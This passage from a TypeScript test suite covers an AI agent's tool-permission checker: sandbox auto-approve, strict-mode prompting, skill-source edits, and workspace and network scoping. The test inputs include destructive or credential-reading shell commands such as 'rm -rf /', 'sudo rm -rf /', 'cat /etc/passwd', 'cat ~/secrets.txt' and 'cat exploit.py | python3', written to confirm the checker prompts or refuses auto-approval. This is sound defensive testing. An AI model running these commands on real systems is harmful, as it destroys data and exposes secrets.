        return async () => {
          const containerSpy = spyOn(
            envRegistry,
            "getIsContainerized",
          ).mockReturnValue(false);
          const workspaceSpy = spyOn(
            platformModule,
            "getWorkspaceDir",
          ).mockReturnValue(MOCK_WORKSPACE);
          try {
            await fn();
          } finally {
            containerSpy.mockRestore();
            workspaceSpy.mockRestore();
          }
        };
      }

      test(
        "ls (no path args) → auto-approve",
        withNonContainerized(async () => {
          mockRiskWithSandboxAutoApprove();
          const result = await check(
            "bash",
            { command: "ls" },
            join(MOCK_WORKSPACE, "project"),
          );
          expect(result.decision).toBe("allow");
          expect(result.reason).toContain("sandbox auto-approve");
        }),
      );

      test(
        "cat README.md with workingDir inside workspace → auto-approve",
        withNonContainerized(async () => {
          mockRiskWithSandboxAutoApprove();
          const result = await check(
            "bash",
            { command: "cat README.md" },
            join(MOCK_WORKSPACE, "project"),
          );
          expect(result.decision).toBe("allow");
          expect(result.reason).toContain("sandbox auto-approve");
        }),
      );

      test(
        "mkdir -p src/utils with workingDir inside workspace → auto-approve",
        withNonContainerized(async () => {
          mockRiskWithSandboxAutoApprove();
          const result = await check(
            "bash",
            { command: "mkdir -p src/utils" },
            join(MOCK_WORKSPACE, "project"),
          );
          expect(result.decision).toBe("allow");
          expect(result.reason).toContain("sandbox auto-approve");
        }),
      );

      test(
        "grep 'pattern' src/foo.ts → auto-approve (pattern skipped, paths in workspace)",
        withNonContainerized(async () => {
          mockRiskWithSandboxAutoApprove();
          const result = await check(
            "bash",
            { command: "grep 'pattern' src/foo.ts" },
            join(MOCK_WORKSPACE, "project"),
          );
          expect(result.decision).toBe("allow");
          expect(result.reason).toContain("sandbox auto-approve");
        }),
      );

      test(
        "sed 's/old/new/' config.json → auto-approve (script skipped, path in workspace)",
        withNonContainerized(async () => {
          mockRiskWithSandboxAutoApprove();
          const result = await check(
            "bash",
            { command: "sed 's/old/new/' config.json" },
            join(MOCK_WORKSPACE, "project"),
          );
          expect(result.decision).toBe("allow");
          expect(result.reason).toContain("sandbox auto-approve");
        }),
      );

      test(
        "cat ~/secrets.txt → falls through to threshold (~ resolves outside workspace)",
        withNonContainerized(async () => {
          const result = await check(
            "bash",
            { command: "cat ~/secrets.txt" },
            join(MOCK_WORKSPACE, "project"),
          );
          // ~ expands to homedir which is outside /workspace
          expect(result.decision).not.toBe("deny");
          expect(result.reason).not.toContain("sandbox auto-approve");
        }),
      );

      test(
        "cat /etc/passwd → falls through (absolute path outside workspace)",
        withNonContainerized(async () => {
          const result = await check(
            "bash",
            { command: "cat /etc/passwd" },
            join(MOCK_WORKSPACE, "project"),
          );
          expect(result.reason).not.toContain("sandbox auto-approve");
        }),
      );

      test(
        "cp file.txt -t /tmp/ → falls through (path flag outside workspace)",
        withNonContainerized(async () => {
          const result = await check(
            "bash",
            { command: "cp file.txt -t /tmp/" },
            join(MOCK_WORKSPACE, "project"),
          );
          // -t /tmp/ is a path flag that resolves outside workspace
          expect(result.reason).not.toContain("sandbox auto-approve");
        }),
      );

      test(
        "pipeline: cat file.txt | grep pattern → auto-approve (all segments workspace-scoped)",
        withNonContainerized(async () => {
          mockRiskWithSandboxAutoApprove();
          const result = await check(
            "bash",
            { command: "cat file.txt | grep pattern" },
            join(MOCK_WORKSPACE, "project"),
          );
          expect(result.decision).toBe("allow");
          expect(result.reason).toContain("sandbox auto-approve");
        }),
      );

      test(
        "rm -rf / → falls through to threshold (path outside workspace)",
        withNonContainerized(async () => {
          const result = await check(
            "bash",
            { command: "rm -rf /" },
            join(MOCK_WORKSPACE, "project"),
          );
          expect(result.reason).not.toContain("sandbox auto-approve");
        }),
      );
    });
  });

  // ── strict mode + high-risk integration tests (PR 25) ─────────

  describe("strict mode + high-risk integration (PR 25)", () => {
    test("strict mode: low-risk with no rule prompts (baseline)", async () => {
      mockIpcResponse("get_global_thresholds", STRICT_GATEWAY_THRESHOLDS);
      _clearGlobalCacheForTesting();
      const result = await check(
        "file_read",
        { path: "/tmp/test.txt" },
        "/tmp",
      );
      expect(result.decision).toBe("prompt");
      expect(result.reason).toContain("above auto-approve threshold");
    });
  });

  // ── skill mutation approval regression tests (PR 30) ──────────
  // Lock full behavior for skill-source edit/write prompts, high-risk
  // persistence, and version mismatch rejection.

  describe("skill mutation approval regressions (PR 30)", () => {
    function ensureSkillsDir(): void {
      mkdirSync(join(checkerTestDir, "skills"), { recursive: true });
    }

    // ── Strict mode: first prompt for skill source writes ──────────

    describe("strict mode: skill source writes prompt with high risk", () => {
      test("strict mode: file_write to skill source prompts (no implicit allow)", async () => {
        mockIpcResponse("get_global_thresholds", STRICT_GATEWAY_THRESHOLDS);
        _clearGlobalCacheForTesting();
        ensureSkillsDir();
        const skillPath = join(
          checkerTestDir,
          "skills",
          "my-skill",
          "executor.ts",
        );
        const result = await check("file_write", { path: skillPath }, "/tmp");
        // The important invariant is that it prompts (default ask rule or strict mode).
        expect(result.decision).toBe("prompt");
      });

      test("strict mode: file_edit of skill source prompts (no implicit allow)", async () => {
        mockRisk("high");
        mockIpcResponse("get_global_thresholds", STRICT_GATEWAY_THRESHOLDS);
        _clearGlobalCacheForTesting();
        ensureSkillsDir();
        const skillPath = join(
          checkerTestDir,
          "skills",
          "my-skill",
          "SKILL.md",
        );
        const result = await check("file_edit", { path: skillPath }, "/tmp");
        expect(result.decision).toBe("prompt");
      });

      test("strict mode: file_write to non-skill path prompts as Strict mode", async () => {
        mockIpcResponse("get_global_thresholds", STRICT_GATEWAY_THRESHOLDS);
        _clearGlobalCacheForTesting();
        const normalPath = "/tmp/some-file.txt";
        const result = await check("file_write", { path: normalPath }, "/tmp");
        expect(result.decision).toBe("prompt");
        // Low-risk file_write in strict mode with no rule → Strict mode reason
        expect(result.reason).toContain("above auto-approve threshold");
      });

      test("workspace mode: file_write to skill source still prompts", async () => {
        mockRisk("high");
        ensureSkillsDir();
        const skillPath = join(
          checkerTestDir,
          "skills",
          "my-skill",
          "executor.ts",
        );
        const result = await check("file_write", { path: skillPath }, "/tmp");
        expect(result.decision).toBe("prompt");
      });

      test("strict mode: host_file_write to skill source prompts (high risk overrides host ask)", async () => {
        mockIpcResponse("get_global_thresholds", STRICT_GATEWAY_THRESHOLDS);
        _clearGlobalCacheForTesting();
        ensureSkillsDir();
        const skillPath = join(
          checkerTestDir,
          "skills",
          "my-skill",
          "executor.ts",
        );
        const result = await check(
          "host_file_write",
          { path: skillPath },
          "/tmp",
        );
        expect(result.decision).toBe("prompt");
      });

      test("strict mode: host_file_edit of skill source prompts", async () => {
        mockIpcResponse("get_global_thresholds", STRICT_GATEWAY_THRESHOLDS);
        _clearGlobalCacheForTesting();
        ensureSkillsDir();
        const skillPath = join(
          checkerTestDir,
          "skills",
          "my-skill",
          "SKILL.md",
        );
        const result = await check(
          "host_file_edit",
          { path: skillPath },
          "/tmp",
        );
        expect(result.decision).toBe("prompt");
      });
    });
  });

  // ── hash-aware skill_load permission candidates (PR 33) ──────
  // When a version hash is available (computed from disk), skill_load
  // command candidates and allowlist options include both a version-specific
  // pattern (skillId@hash) and an any-version pattern (bare skillId).
  // Input-supplied version_hash is always ignored to prevent spoofing.

  describe("hash-aware skill_load permission candidates (PR 33)", () => {
    function ensureSkillsDir(): void {
      mkdirSync(join(checkerTestDir, "skills"), { recursive: true });
    }

    test("allowlist options only include version-specific option when hash is available", async () => {
      ensureSkillsDir();
      writeSkill("test-opts-skill", "Test Options Skill");

      const options = await generateAllowlistOptions("skill_load", {
        skill: "test-opts-skill",
      });

      // Should have only the version-specific option
      expect(options).toHaveLength(1);
      expect(options[0].pattern).toMatch(/^skill_load:test-opts-skill@v1:/);
      expect(options[0].description).toBe("This exact version");
    });

    test("allowlist options ignore input version_hash and use disk-computed hash (regression)", async () => {
      ensureSkillsDir();
      writeSkill("test-opts-explicit", "Test Opts Explicit");

      // Even when a version_hash is supplied in the input, allowlist
      // options must use the disk-computed hash, not the input value.
      const options = await generateAllowlistOptions("skill_load", {
        skill: "test-opts-explicit",
        version_hash: "v1:customhash123",
      });

      expect(options).toHaveLength(1);
      // Should be the disk-computed hash, NOT the input hash
      expect(options[0].pattern).toMatch(/^skill_load:test-opts-explicit@v1:/);
      expect(options[0].pattern).not.toBe(
        "skill_load:test-opts-explicit@v1:customhash123",
      );
      expect(options[0].description).toBe("This exact version");
    });

    test("allowlist options for unresolvable skill fall back to raw selector", async () => {
      ensureSkillsDir();

      const options = await generateAllowlistOptions("skill_load", {
        skill: "no-such-skill",
      });

      // Should have only the raw selector
      expect(options).toHaveLength(1);
      expect(options[0].pattern).toBe("skill_load:no-such-skill");
      expect(options[0].description).toBe("This skill");
    });

    test("allowlist options for empty skill selector only has wildcard", async () => {
      const options = await generateAllowlistOptions("skill_load", {
        skill: "",
      });

      expect(options).toHaveLength(1);
      expect(options[0].pattern).toBe("skill_load:*");
    });
  });

  // ── strict mode: skill_load behavior ──

  describe("strict mode — skill_load behavior (PR 34)", () => {
    test("skill_load prompts in strict mode without an explicit user rule", async () => {
      mockIpcResponse("get_global_thresholds", STRICT_GATEWAY_THRESHOLDS);
      _clearGlobalCacheForTesting();
      const result = await check("skill_load", { skill: "some-skill" }, "/tmp");
      expect(result.decision).toBe("prompt");
      expect(result.reason).toContain("above auto-approve threshold");
    });

    test("skill_load auto-allows in workspace mode (low risk fallback)", async () => {
      const result = await check("skill_load", { skill: "any-skill" }, "/tmp");
      expect(result.decision).toBe("allow");
    });
  });

  // ══════════════════════════════════════════════════════════════════
  // Ship Gate Invariants (PR 40) — Final Security Regression Pack
  // ══════════════════════════════════════════════════════════════════
  // These tests encode the six security invariants from Section 4 of the
  // security rollout plan. They are the final, immutable assertions that
  // must pass before the security hardening is considered complete.

  describe("Ship Gate Invariants (PR 40)", () => {
    // ── Invariant 1: No tool call executes in strict mode without an
    //    explicit matching rule. ──────────────────────────────────────

    describe("Invariant 1: strict mode requires explicit matching rule for every tool", () => {
      test("bash prompts in strict mode (no default allow rule outside container)", async () => {
        mockIpcResponse("get_global_thresholds", STRICT_GATEWAY_THRESHOLDS);
        _clearGlobalCacheForTesting();
        const result = await check("bash", { command: "echo hello" }, "/tmp");
        expect(result.decision).toBe("prompt");
        expect(result.reason).toContain("above auto-approve threshold");
      });

      test("low-risk host_bash prompts in strict mode (no matching rule)", async () => {
        mockIpcResponse("get_global_thresholds", STRICT_GATEWAY_THRESHOLDS);
        _clearGlobalCacheForTesting();
        const result = await check(
          "host_bash",
          { command: "echo hello" },
          "/tmp",
        );
        expect(result.decision).toBe("prompt");
        expect(result.reason).toContain("above auto-approve threshold");
      });

      test("low-risk file_read with no rule prompts in strict mode", async () => {
        mockIpcResponse("get_global_thresholds", STRICT_GATEWAY_THRESHOLDS);
        _clearGlobalCacheForTesting();
        const result = await check(
          "file_read",
          { path: "/tmp/test.txt" },
          "/tmp",
        );
        expect(result.decision).toBe("prompt");
        expect(result.reason).toContain("above auto-approve threshold");
      });

      test("low-risk skill_load prompts in strict mode without an explicit rule", async () => {
        mockIpcResponse("get_global_thresholds", STRICT_GATEWAY_THRESHOLDS);
        _clearGlobalCacheForTesting();
        const result = await check(
          "skill_load",
          { skill: "any-skill" },
          "/tmp",
        );
        expect(result.decision).toBe("prompt");
        expect(result.reason).toContain("above auto-approve threshold");
      });

      test("low-risk file_write with no rule prompts in strict mode", async () => {
        mockIpcResponse("get_global_thresholds", STRICT_GATEWAY_THRESHOLDS);
        _clearGlobalCacheForTesting();
        const result = await check(
          "file_write",
          { path: "/tmp/file.txt" },
          "/tmp",
        );
        expect(result.decision).toBe("prompt");
        expect(result.reason).toContain("above auto-approve threshold");
      });

      test("high-risk bash prompts in strict mode (no default allow rule outside container)", async () => {
        mockRisk("high");
        mockIpcResponse("get_global_thresholds", STRICT_GATEWAY_THRESHOLDS);
        _clearGlobalCacheForTesting();
        const result = await check(
          "bash",
          { command: "sudo apt update" },
          "/tmp",
        );
        expect(result.decision).toBe("prompt");
      });

      test("high-risk host_bash command with no user rule prompts in strict mode", async () => {
        mockIpcResponse("get_global_thresholds", STRICT_GATEWAY_THRESHOLDS);
        _clearGlobalCacheForTesting();
        const result = await check(
          "host_bash",
          { command: "sudo apt update" },
          "/tmp",
        );
        expect(result.decision).toBe("prompt");
      });

      test("skill-origin tool with no rule prompts in strict mode", async () => {
        mockIpcResponse("get_global_thresholds", STRICT_GATEWAY_THRESHOLDS);
        _clearGlobalCacheForTesting();
        const result = await check("skill_test_tool", {}, "/tmp");
        expect(result.decision).toBe("prompt");
      });

      test("bundled skill-origin tool with no rule prompts in strict mode", async () => {
        mockIpcResponse("get_global_thresholds", STRICT_GATEWAY_THRESHOLDS);
        _clearGlobalCacheForTesting();
        const result = await check("skill_bundled_test_tool", {}, "/tmp");
        expect(result.decision).toBe("prompt");
        expect(result.reason).toContain("above auto-approve threshold");
      });
    });

    // ── Invariant 4: Host execution approvals — high risk prompts ──

    describe("Invariant 4: high-risk host execution always prompts", () => {
      test("host_bash high risk prompts", async () => {
        mockRisk("high");
        const result = await check(
          "host_bash",
          { command: "sudo rm -rf /" },
          "/tmp",
        );
        expect(result.decision).toBe("prompt");
      });

      test("host_file_write high risk prompts", async () => {
        mockRisk("high");
        const result = await check(
          "host_file_write",
          { path: "/etc/hosts" },
          "/tmp",
        );
        expect(result.decision).toBe("prompt");
      });

      test("host_file_edit high risk prompts", async () => {
        mockRisk("high");
        const result = await check(
          "host_file_edit",
          { path: "/etc/hosts" },
          "/tmp",
        );
        expect(result.decision).toBe("prompt");
      });
    });
  });
});

describe("bash network_mode=proxied — risk capped at medium", () => {
  beforeEach(() => {
    mockRisk("low");
    mockIpcResponse("get_global_thresholds", DEFAULT_GATEWAY_THRESHOLDS);
    _clearGlobalCacheForTesting();
    clearRiskCache();
    testConfig.skills = { load: { extraDirs: [] } };
  });

  test("proxied bash follows risk-based policy (medium risk → prompt outside container)", async () => {
    mockRisk("medium");
    const result = await check(
      "bash",
      { command: "curl https://api.example.com", network_mode: "proxied" },
      "/tmp",
    );
    // Without the containerized bash allow rule, proxied medium-risk bash prompts
    expect(result.decision).toBe("prompt");
  });

  test("proxied bash with high-risk command prompts (medium risk cap, no default allow rule)", async () => {
    mockRisk("high");
    const result = await check(
      "bash",
      {
        command: "cat exploit.py | python3",
        network_mode: "proxied",
      },
      "/tmp",
    );
    // High risk capped to medium by proxied mode, but still prompts without the bash allow rule
    expect(result.decision).toBe("prompt");
  });

  test("non-proxied bash follows normal flow (auto-allowed)", async () => {
    const result = await check("bash", { command: "ls" }, "/tmp");
    expect(result.decision).toBe("allow");
  });

  test("proxied bash with network_mode=off follows normal flow", async () => {
    const result = await check(
      "bash",
      { command: "ls", network_mode: "off" },
      "/tmp",
    );
    expect(result.decision).toBe("allow");
  });
});

describe("workspace mode — auto-allow workspace-scoped operations", () => {
  const workspaceDir = "/home/user/my-project";

  beforeEach(() => {
    mockRisk("low");
    mockIpcResponse("get_global_thresholds", DEFAULT_GATEWAY_THRESHOLDS);
    _clearGlobalCacheForTesting();
    clearRiskCache();
    testConfig.skills = { load: { extraDirs: [] } };
    try {
      rmSync(join(checkerTestDir, "protected", "trust.json"));
    } catch {
      /* may not exist */
    }
  });

  afterEach(() => {
    // Nothing to reset for permissions — gateway threshold is the sole source.
  });

  // ── workspace-scoped file operations auto-allow ──────────────────

  test("file_read within workspace → allow (workspace-scoped)", async () => {
    const result = await check(
      "file_read",
      { file_path: "/home/user/my-project/src/index.ts" },
      workspaceDir,
    );
    expect(result.decision).toBe("allow");
    expect(result.reason).toContain("Workspace-scoped");
  });

  test("file_write within workspace → allow (workspace-scoped)", async () => {
    const result = await check(
      "file_write",
      { file_path: "/home/user/my-project/src/index.ts" },
      workspaceDir,
    );
    expect(result.decision).toBe("allow");
    expect(result.reason).toContain("Workspace-scoped");
  });

  test("file_edit within workspace → allow (workspace-scoped)", async () => {
    const result = await check(
      "file_edit",
      { file_path: "/home/user/my-project/src/index.ts" },
      workspaceDir,
    );
    expect(result.decision).toBe("allow");
    expect(result.reason).toContain("Workspace-scoped");
  });

  // ── file operations outside workspace follow risk-based fallback ──

  test("file_read outside workspace → allow (Low risk fallback)", async () => {
    const result = await check(
      "file_read",
      { file_path: "/etc/hosts" },
      workspaceDir,
    );
    expect(result.decision).toBe("allow");
    expect(result.reason).toContain("Low risk");
  });

  test("file_write outside workspace → allow (Low risk fallback)", async () => {
    const result = await check(
      "file_write",
      { file_path: "/tmp/outside.txt" },
      workspaceDir,
    );
    expect(result.decision).toBe("allow");
    expect(result.reason).toContain("Low risk");
  });

  // ── bash (non-containerized) — workspace auto-allow blocked, risk-based fallback ──

  test("bash in workspace (low risk, allowlisted) → allow via sandbox auto-approve", async () => {
    mockRiskWithSandboxAutoApprove();
    const result = await check("bash", { command: "ls -la" }, workspaceDir);
    expect(result.decision).toBe("allow");
    // ls has sandboxAutoApprove: true and no path args → sandbox auto-approve fires
    expect(result.reason).toContain("sandbox auto-approve");
  });

  test("bash in workspace (medium risk) → prompt (not auto-allowed)", async () => {
    mockRisk("medium");
    // An unknown program is medium risk; without container, workspace auto-allow is blocked
    const result = await check(
      "bash",
      { command: "some-unknown-program --flag" },
      workspaceDir,
    );
    expect(result.reason).not.toContain("Workspace-scoped");
    expect(result.decision).toBe("prompt");
  });

  // ── proxied bash — risk capped at medium ──

  test("bash with network_mode=proxied → prompt (medium risk, not auto-allowed outside container)", async () => {
    mockRisk("medium");
    const result = await check(
      "bash",
      { command: "curl https://api.example.com", network_mode: "proxied" },
      workspaceDir,
    );
    // Without container, bash isn't auto-allowed via workspace mode; proxied caps at medium → prompt
    expect(result.decision).toBe("prompt");
  });

  // ── host tools — low risk auto-approves in workspace mode ──

  test("host_file_read low risk → allow (low risk threshold)", async () => {
    const result = await check(
      "host_file_read",
      { file_path: "/home/user/my-project/file.txt" },
      workspaceDir,
    );
    expect(result.decision).toBe("allow");
  });

  test("host_bash low risk → allow (low risk threshold)", async () => {
    const result = await check("host_bash", { command: "ls" }, workspaceDir);
    expect(result.decision).toBe("allow");
  });

  test("web_fetch → allow (Low risk, not workspace-scoped but Low risk fallback)", async () => {
    const result = await check(
      "web_fetch",
      { url: "https://example.com" },
      workspaceDir,
    );
    expect(result.decision).toBe("allow");
    expect(result.reason).toContain("Low risk");
  });

  test("network_request → prompt (Medium risk, not workspace-scoped)", async () => {
    mockRisk("medium");
    const result = await check(
      "network_request",
      { url: "https://api.example.com/data" },
      workspaceDir,
    );
    expect(result.decision).toBe("prompt");
    expect(result.reason).toContain("risk");
  });
});

describe("integration regressions (PR 11)", () => {
  beforeEach(() => {
    mockRisk("low");
    mockIpcResponse("get_global_thresholds", DEFAULT_GATEWAY_THRESHOLDS);
    _clearGlobalCacheForTesting();
    clearRiskCache();
    // Delete the trust file to prevent stale default rules from prior tests
    try {
      rmSync(join(checkerTestDir, "protected", "trust.json"));
    } catch {
      /* may not exist */
    }
  });

  afterEach(() => {
    try {
      rmSync(join(checkerTestDir, "protected", "trust.json"));
    } catch {
      /* may not exist */
    }
  });

  test("scope ordering is consistent across tool types", () => {
    const workingDir = "/Users/test/project";

    const bashScopes = generateScopeOptions(workingDir, "bash");
    const hostBashScopes = generateScopeOptions(workingDir, "host_bash");
    const fileScopes = generateScopeOptions(workingDir, "file_write");

    // All should have same ordering: project first, everywhere last
    expect(bashScopes[0].scope).toBe(workingDir);
    expect(bashScopes[bashScopes.length - 1].scope).toBe("everywhere");

    expect(hostBashScopes[0].scope).toBe(workingDir);
    expect(hostBashScopes[hostBashScopes.length - 1].scope).toBe("everywhere");

    expect(fileScopes[0].scope).toBe(workingDir);
    expect(fileScopes[fileScopes.length - 1].scope).toBe("everywhere");

    // Same ordering for host and non-host bash
    expect(bashScopes.map((o) => o.scope)).toEqual(
      hostBashScopes.map((o) => o.scope),
    );
  });

  test("scope options are always least-privilege-first in prompt payload", () => {
    const scopes = generateScopeOptions("/Users/test/project", "host_bash");
    expect(scopes[0].scope).toBe("/Users/test/project");
    expect(scopes[scopes.length - 1].scope).toBe("everywhere");

    // Verify no reordering for host tools
    const nonHostScopes = generateScopeOptions("/Users/test/project", "bash");
    expect(scopes.map((s) => s.scope)).toEqual(
      nonHostScopes.map((s) => s.scope),
    );
  });
});
